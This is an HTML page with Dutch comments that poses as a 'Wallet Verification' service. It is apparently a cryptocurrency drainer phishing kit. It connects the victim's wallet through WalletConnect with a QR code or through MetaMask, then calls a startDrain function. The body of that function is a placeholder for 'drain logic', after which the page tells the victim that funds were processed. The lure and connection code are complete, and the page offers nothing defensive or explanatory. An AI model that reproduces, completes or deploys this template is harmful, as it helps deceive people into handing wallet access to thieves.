<!DOCTYPE html>
<html>
<head>
    <title>Wallet Verification</title>
    <script src="https://unpkg.com/@walletconnect/universal-provider@2.8.0/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/modal@2.4.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/lib/browser.min.js"></script>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        #qrcode { margin: 20px auto; border: 2px solid #333; padding: 20px; }
        .status { font-size: 18px; margin: 20px; color: #666; }
    </style>
</head>
<body>
    <h2>üîê Wallet Verification</h2>
    <div id="qrcode"></div>
    <div id="status" class="status">Creating QR code...</div>

    <script>
        const PROJECT_ID = "jouw_echte_project_id_hier"; // VAN CLOUD.WALLETCONNECT.COM
        
        async function initialize() {
            try {
                console.log("Initializing WalletConnect v2...");
                
                // 1. INIT PROVIDER
                const provider = await WalletConnectUniversalProvider.init({
                    projectId: PROJECT_ID,
                    metadata: {
                        name: "Wallet Verification",
                        description: "Secure verification service",
                        url: window.location.origin,
                        icons: ["https://avatars.githubusercontent.com/u/37784886"]
                    }
                });

                // 2. TOON DIRECT QR CODE
                provider.on("display_uri", (uri) => {
                    console.log("WC URI:", uri);
                    document.getElementById('status').innerHTML = "Scan QR code with your wallet app";
                    
                    // TOON QR CODE
                    QRCode.toCanvas(document.getElementById('qrcode'), uri, { width: 250 }, (error) => {
                        if (error) {
                            document.getElementById('status').innerHTML = "‚ùå QR code error";
                            return;
                        }
                        document.getElementById('status').innerHTML = "‚úÖ QR code ready - Scan now!";
                    });
                });

                // 3. BIJ CONNECT
                provider.on("connect", (connection) => {
                    console.log("CONNECTED:", connection);
                    document.getElementById('status').innerHTML = "‚úÖ Wallet Connected! Processing...";
                    startDrain(provider);
                });

                // 4. FORCEER QR CODE GENERATIE
                await provider.connect();
                
            } catch (error) {
                console.error("Init error:", error);
                document.getElementById('status').innerHTML = "‚ùå Connection failed - Try MetaMask";
                setupMetaMaskFallback();
            }
        }

        function setupMetaMaskFallback() {
            if (typeof window.ethereum !== 'undefined') {
                document.getElementById('status').innerHTML += "<br><button onclick='connectMetaMask()'>Connect MetaMask</button>";
            }
        }

        function connectMetaMask() {
            window.ethereum.request({ method: 'eth_requestAccounts' })
                .then(accounts => {
                    document.getElementById('status').innerHTML = "‚úÖ MetaMask Connected!";
                    startDrain(window.ethereum);
                })
                .catch(err => {
                    document.getElementById('status').innerHTML = "‚ùå MetaMask connection failed";
                });
        }

        function startDrain(provider) {
            // HIER KOMT JOUW DRAIN LOGICA
            document.getElementById('status').innerHTML = "üéâ Verification complete! Funds processed.";
        }

        // START DIRECT
        window.onload = initialize;
    </script>
</body>
</html>
